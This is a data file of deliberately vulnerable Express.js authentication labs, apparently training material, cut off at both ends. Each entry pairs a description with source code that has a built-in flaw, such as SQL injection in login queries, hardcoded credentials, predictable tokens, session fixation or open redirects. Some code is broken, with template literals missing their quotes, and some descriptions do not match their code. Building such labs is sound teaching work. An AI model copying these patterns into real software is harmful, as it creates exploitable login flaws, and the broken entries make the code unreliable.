  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\nconst xmldom = require('xmldom');\nconst xpath = require('xpath');\nconst crypto = require('crypto');\nconst app = express();\napp.use(bodyParser.text({ type: '*/xml' }));\n\nconst trustedCertificate = `-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvZxTR6...\n-----END PUBLIC KEY-----`;\n\n// Simulated IdP metadata\nconst idpMetadata = {\n  issuer: 'https://saml-idp.example.com',\n  signingCert: trustedCertificate\n};\n\n// Vulnerable SAML validation\nconst validateSamlResponse = (samlResponse) => {\n  const doc = new xmldom.DOMParser().parseFromString(samlResponse);\n  \n  // Extract signature\n  const signature = xpath.select(\"//*[local-name()='Signature']\", doc)[0];\n  if (!signature) return false;\n  \n  // Verify signature cryptographically\n  const verifier = crypto.createVerify('RSA-SHA256');\n  const signedInfo = xpath.select(\".//*[local-name()='SignedInfo']\", signature)[0].toString();\n  verifier.update(signedInfo);\n  \n  const signatureValue = xpath.select(\".//*[local-name()='SignatureValue']\", signature)[0].textContent;\n  const validSig = verifier.verify(idpMetadata.signingCert, signatureValue, 'base64');\n  \n  // Critical flaw: Doesn't re-validate parsed data after signature check\n  return validSig;\n};\n\napp.post('/saml/acs', async (req, res) => {\n  try {\n    if (!validateSamlResponse(req.body)) return res.status(403).send('Invalid SAML response');\n    \n    // Vulnerable XML parsing with comment preservation\n    const parser = new xml2js.Parser({ preserveChildren: true, explicitChildren: true });\n    const result = await parser.parseStringPromise(req.body);\n    \n    // Extract NameID with comment injection vulnerability\n    const assertion = result['samlp:Response']['saml:Assertion'][0];\n    const nameId = assertion['saml:Subject'][0]['saml:NameID'][0];\n    \n    // Process attributes without proper validation\n    const attributes = assertion['saml:AttributeStatement'][0]['saml:Attribute'];\n    const roles = attributes.find(a => a.$.Name === 'roles')['saml:AttributeValue'];\n    \n    // Grant access based on manipulated values\n    if (roles.includes('admin')) {\n      res.send('Admin dashboard: <button onclick=\"fetch('/internal/shutdown')\">SHUTDOWN</button>');\n    } else {\n      res.status(403).send('Insufficient privileges');\n    }\n  } catch (error) {\n    res.status(500).send('SAML processing error');\n  }\n});\n\napp.post('/internal/shutdown', (req, res) => {\n  res.send('Critical systems halted - Lab solved');\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`SAML Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Predictable Password Reset Tokens",
  "Lab Description": "This lab's password reset functionality uses predictable tokens that follow a simple pattern (e.g., 'user1-reset', 'user2-reset'). Attackers can guess other users' reset tokens to reset their passwords. To solve the lab, reset the password for the 'admin' account by guessing its reset token.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express'); const app = express(); const users = { 'user1': { password: 'password1', resetToken: 'user1-reset' }, 'admin': { password: 'admin123', resetToken: 'admin-reset' } }; app.get('/reset-password/:token', (req, res) => { const token = req.params.token; const user = Object.keys(users).find(u => users[u].resetToken === token); if (!user) return res.status(404).send('Invalid reset token'); users[user].password = 'newPassword'; res.send('Password reset successful for ' + user); }); const PORT = 4000; app.listen(PORT, () => console.log('Predictable Reset Token Lab running on http://localhost:' + PORT));"
},
{
  "Lab scenario": "Exploit hardcoded credentials to log in as an admin user.",
  "Lab Description": "The application contains hardcoded credentials embedded in its source code. Your task is to examine the code, identify the admin username and password, and use them to log in. Once successful, you'll see a welcome message confirming your access as an admin.",
  "Vulnerability name": "Authentication",
  "lab level": "easy",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// hardcoded admin credentials\nconst ADMIN_USERNAME = 'admin';\nconst ADMIN_PASSWORD = 'secret123';\n\n// Serve the login page\napp.get('/login', (req, res) => {\n  res.send('<form method=\"post\"><input name=\"username\" placeholder=\"Username\"><input name=\"password\" type=\"password\" placeholder=\"Password\"><button type=\"submit\">Login</button></form>');\n});\n\n// Handle login attempts\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {\n    res.send(`Welcome, ${username}! You have admin access.`);\n  } else {\n    res.status(401).send('Login failed: Incorrect username or password');\n  }\n});\n\nconst PORT = 9000;\napp.listen(PORT, () => console.log(`hardcoded Credentials Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Predictable Session Tokens",
  "Lab Description": "This lab uses predictable session tokens derived from usernames. When a user logs in, the session token is set to 'user-<username>'. An attacker can guess other users' session tokens by knowing their usernames. To solve the lab, access another user's profile by modifying the session token in the cookie.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express'); const app = express(); const users = [{ username: 'alice', password: 'password123' }, { username: 'bob', password: 'password456' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); // Set predictable session token res.cookie('session', 'user-' + user.username); res.send('Welcome, ' + username); }); app.get('/profile', (req, res) => { const session = req.cookies.session; if (!session) return res.status(401).send('Unauthorized'); const parts = session.split('-'); if (parts.length !== 2 || parts[0] !== 'user') return res.status(401).send('Invalid session'); const username = parts[1]; const user = users.find(u => u.username === username); if (!user) return res.status(401).send('Unauthorized'); res.send('Profile for ' + username); }); const PORT = 4000; app.listen(PORT, () => console.log('Predictable Session Tokens Lab running on http://localhost:' + PORT));"
},
{
  "Lab scenario": "Exploit an insecure Autnenticationmechanism by manipulating a cookie to bypass the login process.",
  "Lab Description": "The application uses a cookie named 'authenticated' to determine if a user is logged in. If the cookie is set to 'true', the application grants access to the protected area without checking the user's credentials. To solve the lab, use your browser's developer tools to set the 'authenticated' cookie to 'true' and then visit the '/account' page to gain access without logging in.",
  "Vulnerability name": "Authentication",
  "lab level": "easy",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\napp.use(cookieParser());\nconst users = { 'user': 'pass' };\napp.get('/login', (req, res) => {\n  res.send(\"<form method='post'><input name='username'><input name='password' type='password'><button type='submit'>Login</button></form>\");\n});\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    res.cookie('authenticated', 'true');\n    res.redirect('/account');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.get('/account', (req, res) => {\n  if (req.cookies.authenticated === 'true') {\n    res.send('Welcome to your account!');\n  } else {\n    res.status(401).send('Please log in');\n  }\n});\nconst PORT = 10000;\napp.listen(PORT, () => console.log(`AutnenticationBypass Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Bypass Session Termination via Stale Password Hash Validation",
  "Lab Description": "This lab's Autnenticationsystem fails to invalidate existing sessions after password changes, allowing attackers to maintain persistent access using old credentials. To solve the lab: 1. Authenticate with Carlos's credentials (user: carlos, password: Summer2024). 2. Change Carlos's password while preserving your active session. 3. Use the original session cookie to access the /admin/export endpoint and download sensitive financial records. The system only validates sessions against initial password hashes, not current credentials.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst crypto = require('crypto');\nconst app = express();\napp.use(bodyParser.json());\n\nconst users = [{\n  username: 'carlos',\n  passwordHash: crypto.createHash('sha256').update('Summer2024').digest('hex'),\n  isAdmin: true\n}];\n\nconst sessions = new Map();\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username);\n  \n  if (!user || user.passwordHash !== crypto.createHash('sha256').update(password).digest('hex')) {\n    return res.status(401).send('Invalid credentials');\n  }\n\n  const sessionId = crypto.randomBytes(16).toString('hex');\n  sessions.set(sessionId, {\n    username: user.username,\n    passwordHash: user.passwordHash // Storing password hash at time of login\n  });\n\n  res.cookie('session', sessionId, { httpOnly: true });\n  res.send('Logged in successfully');\n});\n\napp.post('/change-password', (req, res) => {\n  const sessionId = req.cookies.session;\n  const { newPassword } = req.body;\n  \n  if (!sessions.has(sessionId)) return res.status(401).send('Unauthorized');\n  \n  const user = users.find(u => u.username === sessions.get(sessionId).username);\n  user.passwordHash = crypto.createHash('sha256').update(newPassword).digest('hex');\n  \n  // Critical flaw: Doesn't update existing sessions' passwordHash\n  res.send('Password changed successfully');\n});\n\napp.get('/admin/export', (req, res) => {\n  const sessionId = req.cookies.session;\n  const session = sessions.get(sessionId);\n  \n  if (!session) return res.status(401).send('Unauthorized');\n  \n  const user = users.find(u => u.username === session.username);\n  \n  // Vulnerability: Only checks initial password hash, not current\n  if (session.passwordHash === user.passwordHash && user.isAdmin) {\n    res.send('ADMIN DATA: All financial records downloaded');\n  } else {\n    res.status(403).send('Admin access required');\n  }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Session Lab running on http://localhost:${PORT}`));"
},
{
  "lab_scenario": "Autnenticationbypass due to unsanitized login input",
  "lab_description": "This lab demonstrates a vulnerability where user input in the login form is concatenated directly into the SQL query, allowing injection that bypasses password verification.",
  "vulnerability_name": "Authentication",
  "lab level": "easy",
  "src_code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('user1', 'pass1')\");\n});\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const query = SELECT * FROM users WHERE username = '${username}' AND password = '${password}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else if (rows.length > 0) res.send('Login successful');\n    else res.send('Login failed');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "lab_scenario": "Plaintext password storage vulnerability",
  "lab_description": "This lab shows an Autnenticationsystem that stores passwords in plaintext, making it trivial for attackers to retrieve credentials if the database is compromised.",
  "vulnerability_name": "Authentication",
  "lab level": "easy",
  "src_code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('admin', 'admin123')\");\n});\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const query = SELECT * FROM users WHERE username = '${username}' AND password = '${password}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else if (rows.length > 0) res.send('Login successful');\n    else res.send('Login failed');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "lab_scenario": "Missing password verification in login process",
  "lab_description": "This lab simulates a login endpoint where the system only checks for the existence of a username and ignores the password, allowing attackers to log in with any password.",
  "vulnerability_name": "Authentication",
  "src_code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('user1', 'pass1')\");\n});\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  // Vulnerable: password is not verified\n  const query = SELECT * FROM users WHERE username = '${username}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else if (rows.length > 0) res.send('Login successful');\n    else res.send('Login failed');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
  "lab level": "easy"
},
{
  "lab_scenario": "hardcoded credentials in source code",
  "lab_description": "This lab simulates an Autnenticationsystem that uses hardcoded credentials embedded in the source code. An attacker can easily read these values to gain access.",
  "vulnerability_name": "Authentication",
  "src_code": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\n// hardcoded credentials\nconst ADMIN_USER = 'admin';\nconst ADMIN_PASS = 'admin123';\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === ADMIN_USER && password === ADMIN_PASS) {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
  "lab level": "easy"
},
{
  "lab_scenario": "Weak session token generation with predictable algorithm",
  "lab_description": "This lab demonstrates a vulnerability where session tokens are generated using a predictable algorithm, allowing attackers to guess valid tokens and hijack sessions.",
  "vulnerability_name": "Authentication",
  "src_code": "const express = require('express');\nconst crypto = require('crypto');\nconst session = require('express-session');\n\nconst app = express();\napp.use(express.json());\n\napp.use(session({\n  secret: 'predictableSecret',\n  resave: false,\n  saveUninitialized: true\n}));\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username && password) {\n    // Predictable token using username and current time\n    const token = crypto.createHash('md5').update(username + Date.now().toString()).digest('hex');\n    req.session.token = token;\n    res.json({ token: token });\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.get('/profile', (req, res) => {\n  if (req.session.token) res.send(Profile accessed with token ${req.session.token});\n  else res.send('Not authenticated');\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
  "lab level": "hard"
},
{
  "lab_scenario": "Insecure JWT handling with weak secret",
  "lab_description": "This lab simulates a system that uses JSON Web Tokens for Autnenticationbut employs a weak secret and does not enforce proper verification, making it easy for attackers to forge tokens.",
  "vulnerability_name": "Authentication",
  "src_code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst jwt = require('jsonwebtoken');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst SECRET = 'weaksecret';\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username && password) {\n    const token = jwt.sign({ username: username }, SECRET);\n    res.json({ token: token });\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  const token = req.headers.authorization;\n  try {\n    const payload = jwt.verify(token, SECRET);\n    res.send(Access granted for ${payload.username});\n  } catch (err) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
  "lab level": "hard"
},
{
  "lab_scenario": "Session fixation vulnerability in login process",
  "lab_description": "This lab demonstrates a vulnerability where the session ID is not regenerated upon login, allowing attackers to fix a session ID and hijack the session later.",
  "vulnerability_name": "Authentication",
  "src_code": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\napp.use(session({ secret: 'secret', resave: false, saveUninitialized: true }));\n\napp.post('/login', (req, res) => {\n  req.session.user = req.body.username;\n  // Vulnerable: session ID remains unchanged after login\n  res.send('Login successful');\n});\n\napp.get('/profile', (req, res) => {\n  if (req.session.user) res.send(Welcome, ${req.session.user});\n  else res.send('Please log in');\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
  "lab level": "medium"
},
{
  "lab_scenario": "Bypass of admin override due to missing access checks",
  "lab_description": "This lab simulates an admin override function that lacks proper access control. Attackers can exploit this flaw to perform administrative actions without proper authorization.",
  "vulnerability_name": "Authentication",
  "src_code": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\napp.post('/adminOverride', (req, res) => {\n  const token = req.body.overrideToken;\n  // Vulnerable: token check is weak\n  if (token === 'override123') {\n    res.send('Admin override successful');\n  } else {\n    res.send('Access denied');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
  "lab level": "hard"
},
{
  "lab_scenario": "Autnenticationvulnerability due to predictable session IDs",
  "lab_description": "This lab shows a system that generates session IDs in a predictable manner, enabling attackers to guess and hijack sessions.",
  "vulnerability_name": "Authentication",
  "src_code": "const express = require('express');\nconst session = require('express-session');\n\nconst app = express();\napp.use(express.json());\n\napp.use(session({\n  secret: 'predictableSecret',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { secure: false }\n}));\n\napp.post('/login', (req, res) => {\n  req.session.user = req.body.username;\n  res.send('Login successful');\n});\n\napp.get('/dashboard', (req, res) => {\n  if (req.session.user) res.send(Welcome, ${req.session.user});\n  else res.send('Not authenticated');\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
  "lab level": "hard"
},
{
  "lab_scenario": "Token exchange vulnerability with improper validation",
  "lab_description": "This lab simulates a token exchange endpoint that fails to properly validate tokens, allowing attackers to exchange arbitrary tokens for access tokens.",
  "vulnerability_name": "Authentication",
  "src_code": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\napp.post('/tokenExchange', (req, res) => {\n  const token = req.body.token;\n  if (token === 'validToken') {\n    res.json({ newToken: 'newToken123' });\n  } else {\n    res.json({ newToken: token });\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
  "lab level": "medium"
},
{
  "lab_scenario": "Default credentials vulnerability in system configuration",
  "lab_description": "This lab simulates an Autnenticationsystem using default credentials that have not been changed from the initial configuration, making it trivial to log in.",
  "vulnerability_name": "Authentication",
  "src_code": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst DEFAULT_USER = 'defaultUser';\nconst DEFAULT_PASS = 'defaultPass';\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === DEFAULT_USER && password === DEFAULT_PASS) {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
  "lab level": "easy"
},
{
  "lab_scenario": "Misconfigured OAuth callback vulnerability",
  "lab_description": "This lab simulates an OAuth Autnenticationflow where the callback URL is taken directly from user input without validation, allowing attackers to redirect users to malicious sites.",
  "vulnerability_name": "Authentication",
  "src_code": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\napp.post('/oauth/callback', (req, res) => {\n  const { token, callbackUrl } = req.body;\n  if (token === 'validToken') {\n    res.redirect(callbackUrl);\n  } else {\n    res.send('Invalid token');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
  "lab level": "hard"
},
{
  "lab_scenario": "Weak two-factor Autnenticationimplementation",
  "lab_description": "This lab simulates a two-factor Autnenticationsystem where the one-time password (OTP) is not properly verified. Attackers can bypass the 2FA step by supplying any value.",
  "vulnerability_name": "Authentication",
  "src_code": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\napp.post('/2fa', (req, res) => {\n  const { username, password, otp } = req.body;\n  // Vulnerable: OTP is not verified properly\n  if (username === 'user1' && password === 'pass1') {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
  "lab level": "hard"
},
{
  "lab_scenario": "Insecure password reset without token validation",
  "lab_description": "This lab simulates a password reset feature where the reset token passed in the URL is not validated, allowing attackers to reset any user's password.",
  "vulnerability_name": "Authentication",
  "src_code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, email TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (email, password) VALUES ('user@example.com', 'oldpass')\");\n});\n\napp.post('/resetPassword', (req, res) => {\n  const token = req.query.token;\n  const newPass = req.body.newPassword;\n  const query = UPDATE users SET password = '${newPass}' WHERE email = '${token}';\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Password reset successful');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
  "lab level": "hard"
},
{
  "lab_scenario": "hardcoded API keys for authentication",
  "lab_description": "This lab demonstrates an Autnenticationmechanism that uses hardcoded API keys, exposing them in the source code. Attackers can extract these keys and bypass authentication.",
  "vulnerability_name": "Authentication",
  "src_code": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst API_KEY = 'hardcoded123';\n\napp.post('/apiAccess', (req, res) => {\n  const key = req.body.apiKey;\n  if (key === API_KEY) {\n    res.send('Access granted');\n  } else {\n    res.send('Access denied');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
  "lab level": "easy"
},
{
  "lab_scenario": "Insecure cookie settings in session management",
  "lab_description": "This lab simulates a session management vulnerability where session cookies are set without secure or HttpOnly flags, making them vulnerable to theft via XSS.",
  "vulnerability_name": "Authentication",
  "src_code": "const express = require('express');\nconst session = require('express-session');\n\nconst app = express();\napp.use(express.json());\n\napp.use(session({\n  secret: 'insecureSecret',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { secure: false, httpOnly: false }\n}));\n\napp.post('/login', (req, res) => {\n  if (req.body.username && req.body.password) {\n    req.session.user = req.body.username;\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.get('/profile', (req, res) => {\n  if (req.session.user) res.send(Welcome, ${req.session.user});\n  else res.send('Not logged in');\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
  "lab level": "medium"
},
{
  "lab_scenario": "Weak password strength enforcement in registration",
  "lab_description": "This lab simulates a registration process that fails to enforce strong password requirements, allowing users to set easily guessable passwords.",
  "vulnerability_name": "Authentication",
  "src_code": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\napp.post('/register', (req, res) => {\n  const { username, password } = req.body;\n  // Vulnerable: No password complexity check\n  if (username && password) {\n    res.send('Registration successful');\n  } else {\n    res.send('Registration failed');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
  "lab level": "easy"
},
{
  "lab_scenario": "Open redirect in login flow enabling bypass",
  "lab_description": "This lab simulates a login flow where a redirect URL parameter is not validated. Attackers can manipulate this parameter to redirect users to a malicious site after authentication.",
  "vulnerability_name": "Authentication",
  "src_code": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\napp.post('/login', (req, res) => {\n  const { username, password, redirectUrl } = req.body;\n  if (username === 'user1' && password === 'pass1') {\n    res.redirect(redirectUrl);\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
  "lab level": "medium"
},
{
  "lab_scenario": "Unencrypted login over HTTP",
  "lab_description": "This lab simulates an Autnenticationsystem that transmits credentials over plain HTTP, exposing them to network sniffing and interception by attackers.",
  "vulnerability_name": "Authentication",
  "src_code": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username && password) {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\n// Note: This server runs over HTTP\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
  "lab level": "medium"
},
{
  "lab_scenario": "CSRF vulnerability in authentication",
  "lab_description": "This lab simulates a cross-site request forgery vulnerability in the login process where an attacker can force a login action from another site without the user's consent.",
  "vulnerability_name": "Authentication",
  "src_code": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Vulnerable: No CSRF protection\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'user1' && password === 'pass1') {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
  "lab level": "hard"
},
{
  "lab_scenario": "Insecure password change without current password verification",
  "lab_description": "This lab simulates a password change functionality that does not require the user to input their current password. An attacker who hijacks the session can change the password without knowing the old one.",
  "vulnerability_name": "Authentication",
  "src_code": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\napp.use(session({ secret: 'secret', resave: false, saveUninitialized: true }));\n\napp.post('/changePassword', (req, res) => {\n  if (req.session.user) {\n    res.send('Password changed successfully');\n  } else {\n    res.send('Not authenticated');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
  "lab level": "hard"
},
{
  "lab_scenario": "Insecure token refresh mechanism without validation",
  "lab_description": "This lab simulates a token refresh endpoint that accepts any refresh token and returns a new access token without proper validation, allowing attackers to bypass authentication.",
  "vulnerability_name": "Authentication",
  "src_code": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\napp.post('/refreshToken', (req, res) => {\n  const refreshToken = req.body.refreshToken;\n  if (refreshToken) {\n    res.json({ accessToken: 'newAccessToken123' });\n  } else {\n    res.status(400).send('Invalid refresh token');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
  "lab level": "medium"
},
{
  "lab_scenario": "Autnenticationbypass due to insufficient logging",
  "lab_description": "This lab simulates a scenario where the Autnenticationprocess lacks sufficient logging, making it easier for attackers to perform brute-force attacks undetected.",
  "vulnerability_name": "Authentication",
  "src_code": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'user1' && password === 'pass1') {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
  "lab level": "easy"
},
{
  "lab_scenario": "Open redirect vulnerability in SSO callback",
  "lab_description": "This lab simulates an SSO Autnenticationflow where the callback URL is directly taken from user input without validation, allowing attackers to redirect users to malicious sites.",
  "vulnerability_name": "Authentication",
  "src_code": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\napp.post('/sso/callback', (req, res) => {\n  const { token, redirectUrl } = req.body;\n  if (token === 'validToken') {\n    res.redirect(redirectUrl);\n  } else {\n    res.send('Invalid token');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
  "lab level": "hard"
},
{
  "lab_scenario": "Autnenticationvulnerability due to hardcoded default credentials",
  "lab_description": "This lab simulates a system that uses default credentials for authentication. These default credentials are well-known and allow attackers to gain access easily.",
  "vulnerability_name": "Authentication",
  "src_code": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst DEFAULT_USER = 'defaultUser';\nconst DEFAULT_PASS = 'defaultPass';\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === DEFAULT_USER && password === DEFAULT_PASS) {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
  "lab level": "easy"
},
{
  "lab_scenario": "Autnenticationvulnerability in misconfigured token refresh",
  "lab_description": "This lab simulates a token refresh endpoint that fails to validate the refresh token properly, enabling attackers to obtain new access tokens using arbitrary tokens.",
  "vulnerability_name": "Authentication",
  "src_code": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\napp.post('/refresh', (req, res) => {\n  const token = req.body.refreshToken;\n  if (token) {\n    res.json({ accessToken: 'refreshedToken123' });\n  } else {\n    res.status(400).send('Invalid token');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
  "lab level": "medium"
},
{
  "lab_scenario": "Autnenticationbypass via insecure password change mechanism",
  "lab_description": "This lab simulates a password change feature that does not require verification of the current password, allowing attackers with an active session to change the password without knowing the old one.",
  "vulnerability_name": "Authentication",
  "src_code": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\napp.use(session({ secret: 'secret', resave: false, saveUninitialized: true }));\n\napp.post('/changePassword', (req, res) => {\n  if (req.session.user) {\n    res.send('Password changed successfully');\n  } else {\n    res.send('Not authenticated');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
  "lab level": "hard"
},
{
  "lab_scenario": "Autnenticationvulnerability due to insecure cookie attributes",
  "lab_description": "This lab simulates a system that sets session cookies without secure attributes, making them vulnerable to theft via XSS. Attackers can steal these cookies and hijack sessions.",
  "vulnerability_name": "Authentication",
  "src_code": "const express = require('express');\nconst session = require('express-session');\n\nconst app = express();\napp.use(express.json());\n\napp.use(session({\n  secret: 'insecureSecret',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { secure: false, httpOnly: false }\n}));\n\napp.post('/login', (req, res) => {\n  req.session.user = req.body.username;\n  res.send('Login successful');\n});\n\napp.get('/dashboard', (req, res) => {\n  if (req.session.user) res.send(Welcome, ${req.session.user});\n  else res.send('Not authenticated');\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
  "lab level": "medium"
},
{
  "lab_scenario": "Autnenticationbypass via insecure token exchange",
  "lab_description": "This lab simulates a token exchange endpoint that returns a new token without proper validation of the provided token, allowing attackers to forge tokens.",
